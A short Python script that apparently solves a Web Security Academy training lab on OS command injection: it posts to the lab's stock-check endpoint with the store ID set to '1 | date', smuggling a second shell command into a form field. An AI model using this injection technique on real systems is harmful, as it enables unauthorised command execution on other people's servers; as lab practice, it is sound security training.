import requests
import sys
import re
from bs4 import BeautifulSoup


s = requests.Session()

site = 'https://acb21f131f030067c029524400190032.web-security-academy.net'
stock_post_url=f'{site}/product/stock'
post_data = {
    'productId' : '1',
    'storeId' : '1 | date'
}
resp = s.post(stock_post_url, data=post_data)
print(resp.text)